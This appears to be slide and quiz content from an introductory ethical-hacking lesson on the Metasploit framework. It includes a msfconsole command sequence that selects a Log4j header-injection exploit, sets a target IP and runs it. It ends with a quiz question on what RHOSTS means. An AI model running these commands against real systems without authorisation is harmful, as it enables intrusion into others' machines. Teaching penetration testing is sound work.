title: Metasploit Framework 🤖
description: The automated toolbox for every ethical hacker.

slides.title: Metasploit 🤖
slides.content:
### Hacking Automation

**Metasploit** is the world's most used penetration testing framework. It contains thousands of ready-made exploits and payloads. 

Instead of writing an exploit from scratch, you just pick one from the database, set the target's IP, and hit 'run'!

slides.title: The msfconsole ⌨️
slides.content: To start Metasploit and search for an exploit:
slides.codeSnippet:
msfconsole
search log4j
use exploit/multi/http/log4j_header_injection
set RHOSTS 192.168.1.50
exploit

quizData.question: In Metasploit, what does 'RHOSTS' represent?
quizData.explanation: 'R' always stands for 'Remote' in networking and hacking tools.
